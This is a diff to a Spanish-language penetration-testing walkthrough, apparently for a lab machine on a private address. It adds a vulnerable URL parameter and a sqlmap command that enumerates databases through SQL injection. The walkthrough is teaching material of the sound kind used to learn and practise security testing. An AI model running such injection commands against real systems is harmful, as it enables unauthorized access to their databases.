@@ -93,9 +93,13 @@ URL con el puerto 666 abierto: `http://192.168.25.131:666`
 
 ![14](https://user-images.githubusercontent.com/75953873/182728213-b629fc94-5457-4086-b57d-f5b01b3aeb2a.png)
 
-- *Paso 7:* Encontrar parámetro vulnerable a inyección SQLI. 
+- *Paso 7:* Encontrar parámetro vulnerable a inyección SQL. 
 
 Navegando en el sitio web se puede observar que la "Lista de artículos de contenido" presenta una URL crítica.
+
+URL: 'http://192.168.25.131:666/index.php?option=com_abc&view=abc&letter=List+of+content+items...&Itemid=3'
+
+Explotar base de datos con SQLmap:
 ```
 sqlmap --url 'http://192.168.25.131:666/index.php?option=com_abc&view=abc&letter=List+of+content+items...&Itemid=3' --dbs --batch
 ```
